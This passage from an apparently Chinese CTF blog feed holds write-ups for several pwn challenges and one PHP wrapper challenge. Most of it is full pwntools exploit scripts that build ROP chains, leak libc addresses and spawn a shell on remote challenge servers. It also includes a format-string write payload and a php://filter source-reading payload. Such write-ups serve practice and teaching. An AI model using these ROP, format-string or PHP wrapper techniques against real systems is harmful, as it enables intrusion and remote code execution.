= （0x43cc-4348）= 0x84</p><p>这是最难的地方</p><p>其次，从其他大佬wp可知，本体的靶机并没有bash，所以使用原来的后门没有用</p><p>因此我们要构造一个rop</p><p>1.call system指令地址</p><p>2.sh</p><p>写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'37458'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line">sh_add = <span class="number">0x08048987</span></span><br><span class="line">call_sys = <span class="number">0x080485B4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr</span><span class="params">(offset,size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"which number to change:"</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.recvuntil(<span class="string">"new number:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"255"</span>)</span><br><span class="line">addr(offset,<span class="number">0xB4</span>)</span><br><span class="line">addr(offset+<span class="number">0x1</span>,<span class="number">0x85</span>)</span><br><span class="line">addr(offset+<span class="number">0x2</span>,<span class="number">0x04</span>)</span><br><span class="line">addr(offset+<span class="number">0x3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">addr(offset+<span class="number">0x4</span>,<span class="number">0x87</span>)</span><br><span class="line">addr(offset+<span class="number">0x5</span>,<span class="number">0x89</span>)</span><br><span class="line">addr(offset+<span class="number">0x6</span>,<span class="number">0x04</span>)</span><br><span class="line">addr(offset+<span class="number">0x7</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="8-pwn100"><a href="#8-pwn100" class="headerlink" title="8.pwn100"></a>8.pwn100</h2><p> 本题设计了中级rop中的ret init</p><p>1.我们首先使用puts获得libc基地址</p><p>但是别忘了将收到的地址去掉不该有的东西，例如“\n”，我这个铁憨憨就因为这个狗东西废了一个小孩是</p><p>2.得到libc版本以及system与str_bin_sh</p><p>3.构造rdi ret getshell</p><p>注意：</p><p>1.本题有很多解决方法，但是我感觉只需要rdi ret 这个gadget就可以</p><p>应该是最简单的方法</p><p>2.注意ret2__libc_csu_init的使用方法，被调函数要是用其got地址</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'44187'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line">offset = <span class="number">0x40</span></span><br><span class="line">fakeebp = <span class="number">1</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040075A</span></span><br><span class="line">csu_front_addr = <span class="number">0x0000000000400740</span></span><br><span class="line">main_add = <span class="number">0x4006B8</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> puts_plt</span><br><span class="line">start_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13 , r14, r15, last)</span>:</span> <span class="comment">#这里的r13 r14 r15 分别为第三 第二 第一个参数</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x40</span> + p64(fakeebp)</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)  <span class="comment">#此时的r12应为被调用函数的got表地址</span></span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span><span class="comment">#0x38的原因看笔记</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="comment">#sh.send(payload)</span></span><br><span class="line">    <span class="comment">#sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> payload.ljust(<span class="number">200</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#payload1 =  csu(0,1,puts_got,0,0,start_got,main_add)</span></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x48</span> + p64(pop_rdi) + p64(start_got) + p64(puts_plt) + p64(main_add)</span><br><span class="line"><span class="comment">#print payload1</span></span><br><span class="line">p.send(payload1.ljust(<span class="number">200</span>,<span class="string">"a"</span>))</span><br><span class="line">p.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">start_add = u64(p.recv().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(start_add)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"__libc_start_main"</span>,start_add)</span><br><span class="line">libc_base = start_add - libc.dump(<span class="string">"__libc_start_main"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi) + p64(bin_add) + p64(sys_add) + p64(main_add)</span><br><span class="line">p.send(payload2.ljust(<span class="number">200</span>,<span class="string">"a"</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="9-pwn200"><a href="#9-pwn200" class="headerlink" title="9.pwn200"></a>9.pwn200</h2><p>很简单的rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'55665'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">payload1 = <span class="string">"a"</span> * (<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(write_plt)+  p32(main)  +p32(<span class="number">1</span>) + p32(main_got) + p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">main_libc = u32(p.recv().strip(<span class="string">'\n'</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> main_libc</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,main_libc)</span><br><span class="line">libc_base = main_libc - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"a"</span> * (<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(sys_add) + p32(<span class="number">1</span>) + p32(bin_add) </span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="10-welpwn"><a href="#10-welpwn" class="headerlink" title="10.welpwn"></a>10.welpwn</h2><p>参考：<a href="https://blog.csdn.net/seaaseesa/article/details/102944448" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/102944448</a></p><p>这里主要考察堆栈结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'58639'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">start_add = <span class="number">0x4007cd</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004008a3</span></span><br><span class="line">pop_4p = <span class="number">0x000000000040089c</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x18</span> + p64(pop_4p) + p64(pop_rdi) + p64(main_got) + p64(puts_plt) + p64(start_add)</span><br><span class="line"><span class="comment">#这里的话要搞清楚为什么需要pop_4p，因为我们需要绕过24个‘a’与pop_4p的地址，去ret我们pop_rdi，以便于继续执行</span></span><br><span class="line"><span class="comment">#p.recvuntil('Welcome to RCTF\n')</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'\x08@'</span>)</span><br><span class="line">main_add = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#这里接受7个字节是因为第八个字节为\x0a其转移字符为换行符，并且其字符是个莫名其妙的东西，做题时会卡在Libcsearch那不动，以后注意</span></span><br><span class="line"><span class="keyword">print</span> hex(main_add)</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,main_add)</span><br><span class="line">libc_base = main_add - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line"><span class="comment">#print libc_base</span></span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload0 =   <span class="string">"a"</span> * <span class="number">0x18</span> + p64(pop_4p) + p64(pop_rdi) + p64(bin_add) + p64(sys_add) + p64(start_add)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><a id="more"></a><p>看一道题</p><p>上图</p><p><img src="https://i.loli.net/2020/01/12/xvLJ782TrQch6MC.png" alt="QQ截图20200112210840.png"></p><p>可知涉及到php伪协议的问题</p><p>1.在file_get_contents 这里</p><p>我们可以使用php://这个协议php://input可以得到原始的post数据</p><p>2.在include（）这里我们可以看到后面有个提示hint.php</p><p>但是我们把file=hint.php时仍然没有任何代码</p><p>我们可以使用：</p><p>php://filter/convert.base64-encode/resource=取源代码并进行base64编码输出</p><p>若不使用base64编码，我们读取的内容会直接当做php代码执行就看不到源代码内容了。</p><p>上payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?Yeedo&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br><span class="line"></span><br><span class="line">post:Yeedo is a big hacker</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/12/4SXqOdg3UrDKB7y.png" alt="QQ截图20200112212501.png"></p><p>解码base64</p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//decode(423e1e68bdc71183573da0cd33a1609)='ypcwelcome';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在之前的payload基础上添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;ypcwelcome</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1a19cbc0200dc984ae400d331a7d1a3d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第四季答题赛 pwn</title>
      <link href="/2019/12/29/%E7%AC%AC%E5%9B%9B%E5%AD%A3%E7%AD%94%E9%A2%98%E8%B5%9B%20pwn/"/>
      <url>/2019/12/29/%E7%AC%AC%E5%9B%9B%E5%AD%A3%E7%AD%94%E9%A2%98%E8%B5%9B%20pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="i春秋·第四季答题赛-pwn"><a href="#i春秋·第四季答题赛-pwn" class="headerlink" title="i春秋·第四季答题赛 pwn"></a>i春秋·第四季答题赛 pwn</h1><a id="more"></a><h2 id="1-Self-service-Refueling-System"><a href="#1-Self-service-Refueling-System" class="headerlink" title="1.Self-service Refueling System"></a>1.Self-service Refueling System</h2><p>这个题要注意我们覆盖的地址为main函数的返回地址，所以要知道我们接受的</p><p>__libc_start_main 地址之前要接受的字符串</p><p>在做这个题的时候问题就出现在的</p><p>1.接受地址的时候没有去掉\n</p><p>2.忘记了将我们覆盖的地方是main函数的返回地址</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./2'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'120.55.43.255'</span></span><br><span class="line">port = <span class="string">'23810'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400fb3</span></span><br><span class="line">main = <span class="number">0x400EAA</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p32(<span class="number">26214</span>) + p32(<span class="number">9011</span>)+ p64(<span class="number">8</span>) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)</span><br><span class="line"><span class="comment">#payload = "a" * (0x20) +p64(8) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Do you want to refuel?(y/n)\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Plz input your Gas Card ID :\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"ou want?(L)\n"</span>,<span class="string">"1L"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"gas\n"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"\x30\x6d"</span>)</span><br><span class="line">add = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line"><span class="keyword">print</span> hex(add)</span><br><span class="line">libc = LibcSearcher(<span class="string">"__libc_start_main"</span>,int(add))</span><br><span class="line">libc_add = add - libc.dump(<span class="string">"__libc_start_main"</span>)</span><br><span class="line"><span class="keyword">print</span> libc_add</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">ret = <span class="number">0x4008B1</span></span><br><span class="line">payload2 = <span class="string">"a"</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p32(<span class="number">26214</span>) + p32(<span class="number">9011</span>)+ p64(<span class="number">8</span>) + p64(pop_rdi) + p64(bin_add)+p64(sys_add)</span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br><span class="line"><span class="comment">#print p.recvuntil("Do you want to refuel?(y/n)")</span></span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Plz input your Gas Card ID :\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendlineafter(<span class="string">"How mang gas do you want?(L)\n"</span>,<span class="string">"1L"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界新手区pwn</title>
      <link href="/2019/12/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BApwn/"/>
      <url>/2019/12/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BApwn/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界新手区pwn"><a href="#攻防世界新手区pwn" class="headerlink" title="攻防世界新手区pwn"></a>攻防世界新手区pwn</h1><a id="more"></a><h2 id="1-nc"><a href="#1-nc" class="headerlink" title="1 nc"></a>1 nc</h2><p>nc 链接获取flag</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>知识：</p><p>关于stdin的知识见博客：<a href="https://blog.csdn.net/xmzzy2012/article/details/80584910" target="_blank" rel="noopener">https://blog.csdn.net/xmzzy2012/article/details/80584910</a></p><p>即：在c语言中表现为调用printf函数将内容输出到终端上。</p><p>这里使用的知识点为任意地址写入：</p><p>我们先找到偏移量</p><p>通过查看找到偏移量offset为：10</p><p>之后我们就可以使用任意地址写</p><p>上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">46545</span>)</span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">pwnme_add = <span class="number">0x804a068</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"summerN"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"please:\n"</span>)</span><br><span class="line">payload = p32(pwnme_add) + <span class="string">"%4c%10$hhn"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>首先查看保护</p><p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575530101770.png" alt="1575530101770"></p><p>发现开启了栈溢出保护但是对于这个题来说貌似没什么卵用</p><p>看完程序，发现直接从get（）那里溢出进入v5直接覆盖就好</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 